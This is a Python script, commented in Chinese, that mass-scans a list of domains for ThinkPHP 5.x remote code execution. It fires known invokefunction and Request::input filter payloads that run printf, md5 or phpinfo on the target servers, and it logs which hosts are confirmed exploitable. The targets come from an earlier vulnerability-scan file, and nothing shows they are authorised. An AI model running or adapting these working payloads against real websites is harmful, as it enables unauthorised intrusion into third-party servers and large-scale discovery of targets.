#!/usr/bin/env python3
"""tp_rce_batch.py - 批量ThinkPHP RCE检测
payloads: TP5 invokefunction / Request::input / _method / s=index
"""
import urllib.request, urllib.parse, ssl, re, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}

# 检测payload: 输出唯一标记
MARK = 'tprce_mark_8842'
# 用phpinfo或md5(1)验证 - 用最安全的: 让程序echo固定字符串
# TP5 RCE payload - 各版本
PAYLOADS = [
    # TP5.0.x invokefunction
    ("invokefunction", "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%s" + MARK),
    # TP5.0.x Request::input
    ("input-filter", "/index.php?s=index/\\think\\Request/input&filter[]=printf&data=%s" % MARK),
    # TP5.1.x 反序列化/参数
    ("s-captcha", "/index.php?s=captcha"),
    # TP5.0.x 日志包含
    ("log-include", "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1"),
    # TP 5.0.23 RCE (method filter)
    ("method-filter", "/index.php?s=/index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"),
]

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(30000).decode('utf-8', 'ignore'), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(30000).decode('utf-8', 'ignore'), e.geturl()
    except Exception:
        return 0, '', ''

def check_tp(dom):
    # 先确认是TP
    st, b, fu = fetch('http://' + dom + '/')
    if st == 0:
        return None
    low = b.lower()
    is_tp = 'thinkphp' in low or 'tp_' in low or 'think\\' in low
    # 测RCE payloads
    for name, path in PAYLOADS:
        st2, b2, fu2 = fetch('http://' + dom + path)
        if st2 == 0:
            continue
        # 检测标记回显
        if MARK in b2:
            return ('RCE', dom, name, fu2)
        # phpinfo检测
        if 'phpinfo' in name and ('PHP Version' in b2 or 'phpinfo()' in b2):
            return ('PHPINFO', dom, name, fu2)
        # 其他回显特征
        if 'PHP Version' in b2 and 'system' in b2.lower():
            return ('PHPINFO2', dom, name, fu2)
    return ('TP', dom, 'confirmed') if is_tp else None

def main():
    doms = []
    with open('/tmp/web_vuln2.txt') as f:
        for line in f:
            if 'thinkphp' in line:
                m = re.search(r'\[CMS\] (\S+)', line)
                if m:
                    doms.append(m.group(1))
    doms = list(dict.fromkeys(doms))
    print('TP targets: %d' % len(doms), flush=True)
    results = []
    with ThreadPoolExecutor(max_workers=12) as ex:
        futs = {ex.submit(check_tp, d): d for d in doms}
        for fu in as_completed(futs):
            try:
                r = fu.result()
            except Exception:
                r = None
            if r:
                results.append(r)
                print('RESULT: %s' % '\t'.join(str(x) for x in r), flush=True)
    with open('/tmp/tp_rce_results.txt', 'w') as f:
        for r in results:
            f.write('\t'.join(str(x) for x in r) + '\n')
    print('=== DONE: %d results ===' % len(results), flush=True)

if __name__ == '__main__':
    main()
